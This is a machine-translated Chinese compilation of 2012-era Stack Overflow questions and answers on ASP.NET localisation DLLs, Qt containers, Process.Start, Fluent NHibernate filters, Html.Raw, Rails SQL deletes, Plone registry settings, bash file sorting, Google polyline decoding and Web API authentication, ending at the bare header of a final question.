我正在开发一个项目，稍后将本地化字符串插入到实时 ASP.NET (MVC4) 站点/应用程序中。我们计划实现这一点（用于验证消息等）的方式是从客户端获取字符串，将它们放入 .resx 文件中，将此 .resx 文件编译为 .resources 文件，然后编译为 .dll。最后，这个 .dll 被放置在现场网站的相关语言文件夹中。但是，此手动创建的 .dll 不会被应用程序拾取。相反，它回退到默认语言 .dll。另一方面，如果 .resx 文件是通过 Visual Studio (2012) 编译的，那么 .dll 会被应用程序愉快地拾取，并显示其中的本地化文本。

我猜问题在于我手动创建 .dll 的方式，尽管我找不到任何问题。这是我在命令行控制台中运行的内容：

```
resgen Strings.fr-FR.resx Strings.fr-FR.resources 
```

然后，

```
al /t:lib /culture:fr-FR /embed:Strings.fr-FR.resources /out:MyApplication.resources.dll 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T13:25:00.667

这可能是因为在生成法语本地化资源 DLL 时使用的命名空间与应用程序用于资源文件的命名空间不同。

您必须将资源文件从 重命名`Strings.fr-FR.resources`为`MyApplication.Namespace.Where.My.Resource.Files.Are.Located.Resources.fr-FR.resources`.

默认情况下，资源文件位于 Properties 文件夹中。这意味着您可以使用完全限定的名称访问本地化字符串`MyApplication.Properties.Resources.MyString`。

如果您的应用程序名为 MyApplication 并且您的资源文件位于 Properties 文件夹下，请以这种方式生成您的资源文件：

```
resgen Strings.fr-FR.resx MyApplication.Properties.Resources.fr-FR.resources 
```

然后以这种方式生成DLL：

```
al /t:lib /Culture:fr-FR /embed:MyApplication.Properties.Resources.fr-FR.resources /out:MyApplication.resources.dll 
```

现在，当您将其放入应用程序 bin 文件夹中的 fr-FR 文件夹中时，它应该可以被识别。

查看您之前生成的程序集的清单以及现在使用 ildasm.exe 生成的程序集。在第二种情况下，您将看到以下行`.mresource public 'MyApplication.Properties.Resources.fr-FR.resources'`，而在第一种情况下，它应该是这样的`.mresource public 'Strings.fr-FR.resources'`。由于您的应用程序在命名空间“MyApplication.Properties”中查找本地化字符串，因此找不到它......当然，将“MyApplication.Properties.Resources”调整为您的应用程序中使用的任何内容（可能是“MyApplication.Localization” .Strings'）。

# c++ - Qt 是否有任何与 Boost 的分配模块等效的东西？

> ID：13360908
> 
> 赞同：5
> 
> 时间：2012-11-13T12:37:14.277
> 
> 标签：c++, qt, boost, containers

在 Boost 中有一些方便的函数可以让你在一行中填充一个容器。

例如，[list_of](http://www.boost.org/doc/libs/1_52_0/libs/assign/doc/index.html#list_of)让您可以像这样填写一个列表。

```
#include <boost/assign/list_of.hpp> // for 'list_of()'
#include <list>
std::list<int> primes = boost::assign::list_of(2)(3)(5)(7)(11); 
```

在我的项目中，我使用的是 Qt，但不能使用 Boost。是否有类似的便捷方式可以在构建时填充 Qt 的容器？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-13T12:50:32.583

您可以使用 QList::operator<<

```
QList<int> primes = QList<int>() << 2 << 3 << 5 << 7 << 11; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-13T12:40:05.890

从 4.8 版开始，Qt 支持大多数容器的 C++11 标准初始化。

[http://doc.qt.digia.com/4.8-snapshot/qt4-8-intro.html](http://doc.qt.digia.com/4.8-snapshot/qt4-8-intro.html)

# c# - 错误 - 当文件确实存在时找不到文件

> ID：13360909
> 
> 赞同：0
> 
> 时间：2012-11-13T12:37:15.830
> 
> 标签：c#, .net, win32exception

我正在尝试使用 运行进程`System.Diagnostics.Process.Start()`，但出现以下错误：

```
System.ComponentModel.Win32Exception: The system cannot find the file specified 
```

我仔细检查了路径，甚至将字符串复制到一个`cmd`窗口，它运行得很好。可能是什么问题呢？

我正在使用 Win7 64 位，我尝试运行的程序是用 mingw64-x64 编译的，我正在为 .NET 2.0 编译

**编辑**
在尝试执行建议时

```
if (File.Exists(Your EXE)) {
} 
```

我发现从命令字符串中删除标志解决了这个问题（我不认为这是一个问题，所以之前没有提到）

如何运行带参数的命令？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:50:39.463

对于参数，请使用[此方法](http://msdn.microsoft.com/en-us/library/h6ak8zt5.aspx)。或使用 ProcessStartInfo 重载。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:43:07.373

Windows 7 文件夹重定向可能是问题所在。

基本上有时当您尝试访问“C:\program files”时，它会将您重定向到“C:\users\username\program files”之类的内容

我正在为您查找一些资源。当我找到比我能解释得更好的东西时，我会告诉你的。

**编辑：**

我发现带有参数的命令*很难*正常工作。我通常只是求助于编写一个批处理文件，然后让 C# 运行它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T13:04:10.870

使用 ProcessStartInfo 类并将值设置为 Arguments 属性：

[http://msdn.microsoft.com/en-us/library/system.diagnostics.processstartinfo.aspx](http://msdn.microsoft.com/en-us/library/system.diagnostics.processstartinfo.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T12:41:02.620

添加一个 if 语句，如：

```
if (File.Exists(Your EXE))
{
    // Start the process
} 
```

否则，您无法确保使用的路径是正确的。

也看看这个[答案](https://stackoverflow.com/a/4358190/395659)，也许它会有所帮助

# asp.net-mvc-3 - 在流利的 nhibernate 中使用 filterdefinition 时出现重复的 filter-def 命名异常

> ID：13360912
> 
> 赞同：0
> 
> 时间：2012-11-13T12:37:19.063
> 
> 标签：asp.net-mvc-3, fluent-nhibernate

我是 fluent hibernate 的新手，在尝试创建过滤器时遇到异常。

我发现这个[语法用 Fluent Nhibernate 定义 NHibernate 过滤器？](https://stackoverflow.com/questions/960625/syntax-to-define-a-nhibernate-filter-with-fluent-nhibernate)

它解释了如何创建一个流畅的过滤器，直到我尝试运行我的应用程序。我得到一个例外（见下文）。我的代码与上面发布的链接相同。这是导致异常的代码。如果我只为映射添加 1 个程序集，例如 HotelMap，问题就消失了，当我添加 2 个或更多时，我得到了异常。

任何想法将不胜感激。

```
private static ISessionFactory BuildSessionFactory()
    {
        var connectionString = DatabaseConnectionStringsFactory.GetConnectionString(DatabaseConnectionStringsFactory.DEFAULT);
        try
        {
            var session = Fluently.Configure()
                .Database(
                    MsSqlConfiguration.MsSql2008.
                        ConnectionString(connectionString).
                        AdoNetBatchSize(50)
                )
                .Mappings(m => m.FluentMappings.Add(typeof(CultureFilter.PonyConditionFilter)))
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<AgentMap>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<HotelMap>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<RoomMap>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<SeasonMap>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<BookingsMap>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<CustomerMap>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<PriceMap>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<GroupRoomsMap>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<PermissionsToBooking>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<Address>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<Owner>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<BookingCancelledBy>())
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<RelatedBookings>())
                .ExposeConfiguration(c =>c.SetProperty("current_session_context_class", "thread_static"))
                .BuildSessionFactory();

            session.OpenSession().EnableFilter("PonyConditionFilter").SetParameter("condition", false);
            return session;

        }
        catch (Exception e)
        {
            throw e;
        }
    } 
```

这是例外

```
 [MappingException: Duplicated filter-def named: PonyConditionFilter]
   NHibernate.Cfg.Mappings.AddFilterDefinition(FilterDefinition definition) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Mappings.cs:472
   NHibernate.Cfg.XmlHbmBinding.MappingRootBinder.AddFilterDefinitions(HbmMapping mappingSchema) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\XmlHbmBinding\MappingRootBinder.cs:75
   NHibernate.Cfg.XmlHbmBinding.MappingRootBinder.Bind(HbmMapping mappingSchema) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\XmlHbmBinding\MappingRootBinder.cs:26
   NHibernate.Cfg.Configuration.AddDeserializedMapping(HbmMapping mappingDocument, String documentFileName) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:522

  [MappingException: Could not compile the mapping document: (XmlDocument)]
   NHibernate.Cfg.Configuration.LogAndThrow(Exception exception) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:342
   NHibernate.Cfg.Configuration.AddDeserializedMapping(HbmMapping mappingDocument, String documentFileName) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:530
   NHibernate.Cfg.Configuration.AddValidatedDocument(NamedXmlDocument doc) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:499
   NHibernate.Cfg.Configuration.ProcessMappingsQueue() in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:1832
   NHibernate.Cfg.Configuration.AddDocumentThroughQueue(NamedXmlDocument document) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:1823
   NHibernate.Cfg.Configuration.AddXmlReader(XmlReader hbmReader, String name) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:1816
   NHibernate.Cfg.Configuration.AddInputStream(Stream xmlInputStream, String name) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:632
   NHibernate.Cfg.Configuration.AddDocument(XmlDocument doc, String name) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:483
   NHibernate.Cfg.Configuration.AddDocument(XmlDocument doc) in d:\CSharp\NH\NH\nhibernate\src\NHibernate\Cfg\Configuration.cs:455
   FluentNHibernate.PersistenceModel.Configure(Configuration cfg) in d:\Builds\FluentNH-v1.x-nh3\src\FluentNHibernate\PersistenceModel.cs:283
   FluentNHibernate.Cfg.MappingConfiguration.Apply(Configuration cfg) in d:\Builds\FluentNH-v1.x-nh3\src\FluentNHibernate\Cfg\MappingConfiguration.cs:88
   FluentNHibernate.Cfg.FluentConfiguration.BuildConfiguration() in d:\Builds\FluentNH-v1.x-nh3\src\FluentNHibernate\Cfg\FluentConfiguration.cs:249

   [FluentConfigurationException: An invalid or incomplete configuration was used while creating a SessionFactory. Check PotentialReasons collection, and InnerException for more detail.] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-08T20:39:27.990

如果所有映射都位于同一个程序集中，则只需为每个程序集添加一个 AddFromAssembly 行。

Fluent NHibernate 将扫描整个程序集以查找您的映射并添加它们。

试试这个：

```
var session = Fluently.Configure()
                .Database(
                    MsSqlConfiguration.MsSql2008.
                        ConnectionString(connectionString).
                        AdoNetBatchSize(50)
                )
                .Mappings(m => m.FluentMappings.AddFromAssemblyOf<AgentMap>())
                .ExposeConfiguration(c =>c.SetProperty("current_session_context_class", "thread_static"))
                .BuildSessionFactory(); 
```

# asp.net-mvc - 如何使 Html.DisplayFor 显示我从数据库中读取的 HTML？

> ID：13360915
> 
> 赞同：5
> 
> 时间：2012-11-13T12:37:28.070
> 
> 标签：asp.net-mvc

我在我的 MVC 项目上使用 CKEditor。我正在将 HTML 保存到数据库中。当我阅读并在屏幕上显示它时，我得到的是

```
 &lt;p&gt; &lt;a href="http://www.cnh.com"&gt;www.cnh.com&lt;/a&gt;&lt;/p&gt; &lt;p&gt; &amp;nbsp;&lt;/p&gt; 
```

我使用 Html.DisplayFor。

```
<td>
    @Html.DisplayFor(modelItem => item.SampleCollectionInstructions)
</td> 
```

如何让它正确显示链接并且每行一个？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-13T12:51:41.780

用于`Raw method`返回没有 html 编码 Ex 的标记；

```
@Html.Raw("<div>Some text</div>") 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2018-09-25T02:28:42.677

如果其他人对循环执行此操作感到困惑，就像我一样：

您可以同时省略**DisplayFor**和**modelItem =>**，因此：

```
@Html.Raw(item.SampleCollectionInstructions) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-11-23T21:10:22.103

您可以使用

```
@Html.Raw(WebUtility.HtmlDecode(Item.APPTXT)) 
```

# sql - Rails从内部连接中删除SQL结果

> ID：13360917
> 
> 赞同：0
> 
> 时间：2012-11-13T12:37:33.893
> 
> 标签：sql, ruby-on-rails, migration

我有两个表帐户和详细信息。

一个账户有很多细节。

细节之一是公司规模。他们的排名是1-7。我想删除大小为 6 的所有帐户，然后我想更新帐户，以便将所有大小为 7 的帐户更改为大小 6。所以基本上我从系统中删除大小为 6 的公司。我正在考虑在迁移中这样做。

```
class RemoveEmeAccounts < ActiveRecord::Migration
  def change
  ActiveRecord::Base.connection.execute("*****")
  ActiveRecord::Base.connection.execute("Update details set size = 6 where size = 7")
  end
end 
```

问题是删除大小为 6 的公司的 sql 语句我在想这样的事情

```
ActiveRecord::Base.connection.execute("DELETE accounts INNER JOIN details ON accounts.id=details.account.id WHERE details.size = 6") 
```

但这对我来说很有趣。我对 sql 语句真的很陌生，因此感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:58:01.140

就像是

```
DELETE accounts 
from details INNER JOIN accounts ON accounts.id = details.account_id
WHERE details.size = 6 
```

但是，请记住，这会在您的详细信息表中留下孤立的记录

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T12:58:03.650

您可以使用 ActiveRecord API 完成此任务。您应该始终尽量减少应用程序中纯 SQL 语句的数量（以实现跨数据库兼容性）。

```
ActiveRecord::Base.transaction do
  Account.joins(:details).where(:size => 6).delete_all
  Account.joins(:details).where(:size => 7).update_all(:size => 6)
end 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T12:52:36.103

好吧，这条 SQL 语句将起作用。在这里，我做了一个内部 SELECT 来获取你想要的所有 id，并在外部 DELETE 上使用它。

```
DELETE FROM accounts 
WHERE id IN 
(
  SELECT accounts.id FROM accounts 
  INNER JOIN details ON accounts.id = details.account_id 
  WHERE details.size = 6
) 
```

# javascript - 在 Plone 的 registry.xml 中禁用 CSS/JS 的合并

> ID：13360923
> 
> 赞同：4
> 
> 时间：2012-11-13T12:38:21.840
> 
> 标签：javascript, css, merge, registry, plone

是否可以在 Plone 的 css/js registry.xml 中禁用 CSS/JS 文件的合并？

像这样的东西：

```
 <javascript id="++my++theme/javascripts/myscript.js" 
            mergeble="False"
  /> 
```

可以使用 cacheable="False" 左右启用/禁用缓存和其他选项，例如 cssregistry.xml。但是有没有办法禁用合并？在 Plone 文档中没有任何内容..

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-13T13:23:19.797

好的，这并不直观，但您正在寻找的选项是“cookable=false”。请参阅[http://docs.plone.org/develop/addons/javascript.html#registering-javascripts-to-portal-javascripts](http://docs.plone.org/develop/addons/javascript.html#registering-javascripts-to-portal-javascripts)

您也可以通过 ZMI ( [http://yoursite.example.org/portal_css/manage_cssForm](http://yoursite.example.org/portal_css/manage_cssForm) ) 完成此操作，其中选项更明显，然后从 portal_setup 工具导出注册表 XML。这样您就可以准确地看到正确的语法。

# linux - 在bash中对文件进行数字排序

> ID：13360925
> 
> 赞同：13
> 
> 时间：2012-11-13T12:38:30.683
> 
> 标签：linux, bash, sorting, ls

我需要对 .flv 文件进行数字排序，并且可以使用以下命令进行排序：

```
ls *\.flv | sort --version-sort -f 
```

但是有很多文件（数百个），它的排序不正确。

```
ls *\.flv | sort --version-sort -f | tail -n 20
e680.flv
e681.flv
e682.flv
e683.flv
e684.flv
e685.flv
e686.flv
e687.flv
e688.flv
e689.flv
e690.flv
e691.flv
e692.flv
e693.flv
e694.flv
e695.flv
**e696.flv**
s572.flv
s602.flv
s654.flv 
```

但奇怪的是，如果我在没有`"*.flv"`工作的情况下破坏了命令。 *我可以只使用 ls 但我在文件夹中有其他文件类型。*

```
ls | sort --version-sort -f | tail -n 20
e680.flv
e681.flv
e682.flv
e683.flv
e684.flv
e685.flv
e686.flv
e687.flv
e688.flv
e689.flv
e690.flv
e691.flv
e692.flv
e693.flv
e694.flv
e695.flv
e696.flv 
```

到目前为止我已经尝试过：

```
 ls | sort --version-sort -f | grep "flv"
    ls *.flv | sort --version-sort -f
    ls *\.flv | sort --version-sort -f
    ls *.flv | sort -f 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-13T12:58:23.563

我会尝试以下代码。适用于我的测试场景：

```
ls -1 *\.flv | sort -n -k1.2 
```

每行`ls`列出 flv 文件 1，每行上`sort`的第一个（也是唯一一个）单词从第二个字符（数字的开头）开始。按数字排序

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2017-12-02T13:16:19.897

`1.flv`给定一个文件夹，其中包含从到顺序命名的文件`9999.flv`

```
ls -v1 *.flv 
```

将输出：

```
1.flv
2.flv
...
10.flv
...
90.flv
...
100.flv
101.flv
...
9999.flv 
```

从[手册页](http://linuxcommand.org/lc3_man_pages/ls1.html)：

```
 -v     natural sort of (version) numbers within text
    -1     list one file per line 
```

为简洁起见，上面的两个标志可以合并为`-v1`.

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-13T12:59:53.990

要在第一个字符后按数字排序，试试这个：

```
sort -k1.2n 
```

# google-maps-api-3 - Directions API overview_polyline 没有正确的点

> ID：13360928
> 
> 赞同：6
> 
> 时间：2012-11-13T12:38:36.160
> 
> 标签：google-maps-api-3

有人对 Google Directions API 返回的积分有疑问吗？overview_polyline 似乎与我要求的方向不匹配。Directions API 给出了示例： [http ://maps.googleapis.com/maps/api/directions/json?origin=Toronto&destination=Montreal&sensor=false](http://maps.googleapis.com/maps/api/directions/json?origin=Toronto&destination=Montreal&sensor=false)

在我看到的 JSON 响应中包括：

```
 "overview_polyline" : {
            "points" : "e`miGhmocNaN~DiBiNe@gEkEek@kNez@cJqq@sk@pGos@v]_}@aF_y@qm@qDe~@w]g~@gZ_Jo_@m_@yNsFgUpMov@~QebBrJq`BjTsx@w@kOqbEq_@qkCcf@}}Dej@yzCuf@o{Ba]m~EtVewAnBa`@sNmm@}dDufGqwA_|D_z@g~CmtBkuOrBmtCyG_yCam@{`Ee]qkB}d@ucDmDe|Aha@e}At]{v@xD}e@yf@aeIm^{rEgp@ahBiZu`BkVueH}gDwuXu`Fi__@yZecHgoAgyIl[ybCo^sgD_n@akBaJmeBog@yyAe`@ayB~FifCjNkmAzTwpAgf@cpFy~@{lJsg@ojHyi@e_Fq}@o`Dog@}tBoYmz@y`@sf@qf@ohCkLugBuv@seAg[ul@mMowBqc@iiC}eAcwCqm@_fBmuAypFyIiqA}BwyBy`@ogAwt@ypBezC{dIahBwxJgb@ytCw~AwvJkQwu@{t@yrCg{@s{Fgb@ehDzKsdAxO}vAiRmpCwcAorNuwAgdS_r@imJq[orAk]wrA_TyzAnFefAa\\guB_OmwAwF{tCwMcbDcr@m}_@}Qo_RgMo|A|d@kpAne@u{Brb@wnDzNkuB_D{v@eSgf@w\\ieAyb@guCii@ifCga@i_Amc@m]urAyoD}o@kiIsr@opQuLkhAc_@q`Bq\\}bEeEyi@iE}t@pHi|@tBmlBebB{qHq_BinFoWgpBoDuqEob@k{ConAedC}L}h@yd@yfAgz@}gAaZi_@m}@mcBwyAaj@_bBg|@csBm_Bo|BkaC{iBqsB_YqyBxEmtBks@aoB{RgLa~@bCcr@cLyoAemBeg@gt@_}@e`@on@uu@etA}vCqp@ubAklDgeGmxFiqHaqFoeHa[wbBu]}gAuoDeeG{uAooB_uAsy@om@ugAu_L{xSshEe_KieDm|KcfIcuWeUcOwy@aP{QuUg`BipF{P_l@klAgaEmjEs}NsvAiyFs}@izFjwAqrGtHkbCeB{cEql@g~CgSk|@mB}oAqNekEgw@cmDo_BgjFqqC}gH}`CwvG}cA{cB}nFowQ_t@an@efBmpE_oAsvCka@mwBk_CqbGuu@qfB{uAmrDivDw|E{nAqbDmpCyaJgdCejHk~@owAsw@adAm_@abA}Ven@qCou@cKeiBca@_cBmlAyjAsn@_kCk}@smDkVg{Bk}@gcHox@_sEaPwdC~KazF{EcpCrEmeGl]auBeEi~@yiAovCwwAgsC{i@oSsbAu~Ay_AmaBk_@iKak@mh@_BmBk@wHvG@dBvA"
         }, 
```

使用[交互式折线编码器实用程序](https://developers.google.com/maps/documentation/utilities/polylineutility)对此进行解码显示了一条从多伦多开始的路径，如预期的那样，但走向不同的方向，终点远不及蒙特利尔。

有任何想法吗？

对于背景，我正在尝试使用折线生成静态地图。静态地图 API 允许传递编码的折线。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-13T13:47:43.853

我使用 Mark McClure 的工具取得了成功：

[http://facstaff.unca.edu/mcmcclur/GoogleMaps/EncodePolyline/](http://facstaff.unca.edu/mcmcclur/GoogleMaps/EncodePolyline/)

[在archive.org上](https://web.archive.org/web/20131122011459/http://facstaff.unca.edu/mcmcclur/GoogleMaps/EncodePolyline/)

当我使用此工具对其进行解码时，您的折线对我有用：

[http://facstaff.unca.edu/mcmcclur/GoogleMaps/EncodePolyline/decode.html](http://facstaff.unca.edu/mcmcclur/GoogleMaps/EncodePolyline/decode.html)

[在archive.org上](https://web.archive.org/web/20131122011459/http://facstaff.unca.edu/mcmcclur/GoogleMaps/EncodePolyline/decode.html)

这显示结果：

[http://facstaff.unca.edu/mcmcclur/GoogleMaps/EncodePolyline/encodeForm.html](http://facstaff.unca.edu/mcmcclur/GoogleMaps/EncodePolyline/encodeForm.html)

[在archive.org上](https://web.archive.org/web/20131122011459/http://facstaff.unca.edu/mcmcclur/GoogleMaps/EncodePolyline/encodeForm.html)

编码多段线通常会出现“\”转义下一个字符的问题。

请参阅此示例 [1]（似乎无法将其显示为链接）

每个 '\' 更改为单个 '\' 从这个[问题](http://code.google.com/p/gmaps-api-issues/issues/detail?id=4555)中它确实显示为链接。

[1]`http://maps.googleapis.com/maps/api/staticmap?size=400x400&path=weight:3|color:blue|enc:cyrdIzsee@dOiBpG~j@bA%60t@mGxu@y@xl@pDdTtOnrAtRg@~J|AdHcI~Dpn@dIbwAhY%60Yde@rxBld@d%60B~LpkAzXvtB%60]rt@n_@bqAlo@vw@|NxrApYv{@%60R%60o@hHvqA|i@blE|iArhDdaAvwFz[vkCfsAl{Ei@f_@gYb}@aNtq@rAfv@nRx_Ajg@xbBnQtXnh@%60d@jz@xe@p\pt@pVrY|e@pO%60vAjwAxhAj%60Bj_AzcEvG~c@[ht@yMfz@tIhlDnv@nwIvDfmCiPlrCj@%60sCf]%60vEtVnvCfYzcAfYt_@zUlNtbArWbb@nm@fR~pAsBhqClGjlBj]zxCjo@lbD~a@%60gAzc@ft@lf@faBt]jhAluAjfCntAjlBjk@jWbZvEn^nRxTdWldArsAxWjz@zHhoBuEryCkWrbAwIn_A%60SbhBx\tbBbZpz@hy@pdBzNfm@|Cdq@fKtjAbM~Xf_@dXh}@tArv@h[|pAbb@%60_@nKf_@pYxb@bx@bh@hbAlkAr_BrNjJ|d@dE~|@jJ%60iBfWjhBgs@jr@rEbvAbhAdUfQdU%60Ete@iCrk@aWlXiN%60%60@wFl\dIzVdUz\ls@hw@|fAh|@|pAfiAbnAp|@v{A~[rhAzUhQpf@pG~r@lSdo@te@~T|\bv@jwApf@tsAvj@l~Bfh@fyA|v@nhBdmA~dBdy@vdBz%60@hlB~[~oBbo@znAxsCzbC%60%60@bs@pm@zo@nq@ly@dm@peApi@rr@lo@pXzl@jm@vh@~_A|}AboBle@lh@|_@rOzh@yQfb@oR%60k@%60@lf@nV~p@~u@nl@xpAvnAdgBpq@~\~n@bD%60%60A_A||@fKlzCre@x|BcHbo@hPff@ze@hYbsAps@pgA~p@pgAvYlt@b~@|kDzThe@%60b@%60^zeAntBv%60@%60dAxSvrBhm@hyFfTriA~DjkA~\%60fClo@jeDnS~b@zZfcA|k@j_Cv%60AznCrv@fnAjl@vt@fcAl|@pl@%60dApb@~o@~Mb\zUbUxf@zJtXHf_@g[j\sa@hg@cP%60nAsM%60_BmBpk@_Kz_@sOft@{G~a@%60C~f@cGjj@mTlc@sKl^hGdn@bv@na@pRni@vNzf@re@~qAngAr}Al{@l~@hIt_AfLpyBzvArcAvjAdkBndAtt@faA~x@jv@dkAhy@%60h@hr@jZjWpv@t\bd@xIr\rGrZc%60@d[ad@rIa%60@dT{KhQdLnKfTnOvUdUBje@qQdYrPlRnU%60HbANrGaNbu@jR|jDvAzhChEnUjJtbA}Af[l@|\lKvQMtLtFhh@fHlh@_DZ_BmO&sensor=false`

这是您在静态地图上的线（更改`\\`为之后`\`）：

`http://maps.googleapis.com/maps/api/staticmap?size=400x400&path=weight:3|color:blue|enc:e%60miGhmocNaN~DiBiNe@gEkEek@kNez@cJqq@sk@pGos@v]_}@aF_y@qm@qDe~@w]g~@gZ_Jo_@m_@yNsFgUpMov@~QebBrJq%60BjTsx@w@kOqbEq_@qkCcf@}}Dej@yzCuf@o{Ba]m~EtVewAnBa%60@sNmm@}dDufGqwA_|D_z@g~CmtBkuOrBmtCyG_yCam@{%60Ee]qkB}d@ucDmDe|Aha@e}At]{v@xD}e@yf@aeIm^{rEgp@ahBiZu%60BkVueH}gDwuXu%60Fi__@yZecHgoAgyIl[ybCo^sgD_n@akBaJmeBog@yyAe%60@ayB~FifCjNkmAzTwpAgf@cpFy~@{lJsg@ojHyi@e_Fq}@o%60Dog@}tBoYmz@y%60@sf@qf@ohCkLugBuv@seAg[ul@mMowBqc@iiC}eAcwCqm@_fBmuAypFyIiqA}BwyBy%60@ogAwt@ypBezC{dIahBwxJgb@ytCw~AwvJkQwu@{t@yrCg{@s{Fgb@ehDzKsdAxO}vAiRmpCwcAorNuwAgdS_r@imJq[orAk]wrA_TyzAnFefAa\guB_OmwAwF{tCwMcbDcr@m}_@}Qo_RgMo|A|d@kpAne@u{Brb@wnDzNkuB_D{v@eSgf@w\ieAyb@guCii@ifCga@i_Amc@m]urAyoD}o@kiIsr@opQuLkhAc_@q%60Bq\}bEeEyi@iE}t@pHi|@tBmlBebB{qHq_BinFoWgpBoDuqEob@k{ConAedC}L}h@yd@yfAgz@}gAaZi_@m}@mcBwyAaj@_bBg|@csBm_Bo|BkaC{iBqsB_YqyBxEmtBks@aoB{RgLa~@bCcr@cLyoAemBeg@gt@_}@e%60@on@uu@etA}vCqp@ubAklDgeGmxFiqHaqFoeHa[wbBu]}gAuoDeeG{uAooB_uAsy@om@ugAu_L{xSshEe_KieDm|KcfIcuWeUcOwy@aP{QuUg%60BipF{P_l@klAgaEmjEs}NsvAiyFs}@izFjwAqrGtHkbCeB{cEql@g~CgSk|@mB}oAqNekEgw@cmDo_BgjFqqC}gH}%60CwvG}cA{cB}nFowQ_t@an@efBmpE_oAsvCka@mwBk_CqbGuu@qfB{uAmrDivDw|E{nAqbDmpCyaJgdCejHk~@owAsw@adAm_@abA}Ven@qCou@cKeiBca@_cBmlAyjAsn@_kCk}@smDkVg{Bk}@gcHox@_sEaPwdC~KazF{EcpCrEmeGl]auBeEi~@yiAovCwwAgsC{i@oSsbAu~Ay_AmaBk_@iKak@mh@_BmBk@wHvG@dBvA&sensor=false`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-05-24T07:03:58.523

Google APi 现在有一个参数：`path=enc:`

```
"https://maps.googleapis.com/maps/api/staticmap?
size=300x300&key=YOUR_KEY&path=enc:" + direction.routes[0].overview_polyline 
```

[专注于官方指南](https://developers.google.com/maps/documentation/static-maps/intro?hl=en#EncodedPolylines)

# asp.net-mvc - ASP.NET Web API - Windows 窗体应用程序中的身份验证

> ID：13360930
> 
> 赞同：5
> 
> 时间：2012-11-13T12:38:42.527
> 
> 标签：asp.net-mvc, winforms, authentication, asp.net-mvc-4, asp.net-web-api

我使用 ASP.NET MVC 4 开发了一个 Web 系统，我必须使用 .NET Web API 和 Windows 窗体应用程序执行集成。

到目前为止一切都很好，但现在我需要使用 Windows 窗体应用程序对用户进行身份验证，并且该应用程序将在 Internet 上打开。

我的应用程序已经包含在数据库中注册的用户，并且当前使用 ASP.NET MVC 的组件“授权”进行身份验证。

对于通过客户端（Windows 窗体应用程序）进行数据消费，目前我使用库 Microsoft ASP.NET Web 客户端 API。

我怎样才能安全地完成这项任务？有没有人有什么建议？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T13:03:21.850

您可以扩展 HttpClient 以添加身份验证。一个例子可以在[这里](http://blogs.msdn.com/b/henrikn/archive/2012/02/16/extending-httpclient-with-oauth-to-access-twitter.aspx)找到。它展示了如何`HttpMessageHandler`使用 OAuth 将 a 添加到您的管道中以进行身份​​验证。

这是[ASP.NET Web API 和 HttpClient 示例的完整列表](http://blogs.msdn.com/b/webdev/archive/2012/08/26/asp-net-web-api-and-httpclient-samples.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T13:34:15.090

看看[这个 Q&A](https://stackoverflow.com/questions/12629530/how-to-customize-asp-net-web-api-authorizeattribute-for-unusual-requirements)，它描述了为 Web API 创建一个自定义 AuthorizeAttribute，它还使用 http 基本安全性对用户进行身份验证，并从 HTTP 标头中获取凭据。请注意，ASP.NET Web API (System.Web.Http.AuthorizeAttribute) 与 MVC 控制器 (System.Web.Mvc.AuthroizeAttribute) 有不同的 AuthorizeAttribute。他们有不同的行为。您不希望将对 Web API 的调用重定向到登录页面。

# ruby-on-rails-3 - Heroku 中的 Ruby 1.9.3p327

> ID：13360932
> 
> 赞同：2
> 
> 时间：2012-11-13T12:38:44.383
> 
> 标签：ruby-on-rails-3, security, heroku, ruby-1.9.3

